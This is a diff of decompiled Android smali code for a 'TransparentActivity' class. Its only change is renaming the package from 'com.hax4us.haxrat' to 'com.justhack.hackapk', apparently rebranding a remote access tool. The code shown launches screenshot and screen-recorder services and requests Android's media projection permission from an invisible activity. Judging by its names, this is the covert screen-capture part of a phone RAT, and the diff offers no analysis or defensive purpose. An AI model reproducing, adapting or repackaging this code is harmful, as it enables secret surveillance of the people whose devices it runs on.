@@ -1,4 +1,4 @@
-.class public final Lcom/hax4us/haxrat/TransparentActivity;
+.class public final Lcom/justhack/hackapk/TransparentActivity;
 .super Landroid/app/Activity;
 .source "TransparentActivity.java"
 
@@ -128,7 +128,7 @@
     .line 31
     move-object v8, v0
 
-    invoke-virtual {v8}, Lcom/hax4us/haxrat/TransparentActivity;->getIntent()Landroid/content/Intent;
+    invoke-virtual {v8}, Lcom/justhack/hackapk/TransparentActivity;->getIntent()Landroid/content/Intent;
 
     move-result-object v8
 
@@ -145,7 +145,7 @@
     .line 32
     move-object v8, v0
 
-    invoke-virtual {v8}, Lcom/hax4us/haxrat/TransparentActivity;->getIntent()Landroid/content/Intent;
+    invoke-virtual {v8}, Lcom/justhack/hackapk/TransparentActivity;->getIntent()Landroid/content/Intent;
 
     move-result-object v8
 
@@ -189,7 +189,7 @@
     move-object v11, v0
 
     :try_start_0
-    const-string v12, "com.hax4us.haxrat.Screenshot"
+    const-string v12, "com.justhack.hackapk.Screenshot"
 
     invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
     :try_end_0
@@ -199,13 +199,13 @@
 
     invoke-direct {v10, v11, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
-    iput-object v9, v8, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;
+    iput-object v9, v8, Lcom/justhack/hackapk/TransparentActivity;->intent2:Landroid/content/Intent;
 
     .line 42
     :goto_2
     move-object v8, v0
 
-    iget-object v8, v8, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;
+    iget-object v8, v8, Lcom/justhack/hackapk/TransparentActivity;->intent2:Landroid/content/Intent;
 
     const-string v9, "resultCode"
 
@@ -218,7 +218,7 @@
     .line 43
     move-object v8, v0
 
-    iget-object v8, v8, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;
+    iget-object v8, v8, Lcom/justhack/hackapk/TransparentActivity;->intent2:Landroid/content/Intent;
 
     const-string v9, "android.intent.extra.INTENT"
 
@@ -233,9 +233,9 @@
 
     move-object v9, v0
 
-    iget-object v9, v9, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;
+    iget-object v9, v9, Lcom/justhack/hackapk/TransparentActivity;->intent2:Landroid/content/Intent;
 
-    invoke-virtual {v8, v9}, Lcom/hax4us/haxrat/TransparentActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    invoke-virtual {v8, v9}, Lcom/justhack/hackapk/TransparentActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
 
     move-result-object v8
 
@@ -320,7 +320,7 @@
     move-object v11, v0
 
     :try_start_1
-    const-string v12, "com.hax4us.haxrat.ScreenRecorderService"
+    const-string v12, "com.justhack.hackapk.ScreenRecorderService"
 
     invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
     :try_end_1
@@ -330,18 +330,18 @@
 
     invoke-direct {v10, v11, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
-    iput-object v9, v8, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;
+    iput-object v9, v8, Lcom/justhack/hackapk/TransparentActivity;->intent2:Landroid/content/Intent;
 
     .line 40
     move-object v8, v0
 
-    iget-object v8, v8, Lcom/hax4us/haxrat/TransparentActivity;->intent2:Landroid/content/Intent;
+    iget-object v8, v8, Lcom/justhack/hackapk/TransparentActivity;->intent2:Landroid/content/Intent;
 
     const-string v9, "secs"
 
     move-object v10, v0
 
-    invoke-virtual {v10}, Lcom/hax4us/haxrat/TransparentActivity;->getIntent()Landroid/content/Intent;
+    invoke-virtual {v10}, Lcom/justhack/hackapk/TransparentActivity;->getIntent()Landroid/content/Intent;
 
     move-result-object v10
 
@@ -442,14 +442,14 @@
 
     move-object v7, v3
 
-    invoke-virtual {v6, v7}, Lcom/hax4us/haxrat/TransparentActivity;->setContentView(Landroid/view/View;)V
+    invoke-virtual {v6, v7}, Lcom/justhack/hackapk/TransparentActivity;->setContentView(Landroid/view/View;)V
 
     .line 60
     move-object v6, v0
 
     const-string v7, "media_projection"
 
-    invoke-virtual {v6, v7}, Lcom/hax4us/haxrat/TransparentActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {v6, v7}, Lcom/justhack/hackapk/TransparentActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object v6
 
@@ -468,7 +468,7 @@
 
     const/4 v8, 0x1
 
-    invoke-virtual {v6, v7, v8}, Lcom/hax4us/haxrat/TransparentActivity;->startActivityForResult(Landroid/content/Intent;I)V
+    invoke-virtual {v6, v7, v8}, Lcom/justhack/hackapk/TransparentActivity;->startActivityForResult(Landroid/content/Intent;I)V
 
     return-void
 .end method
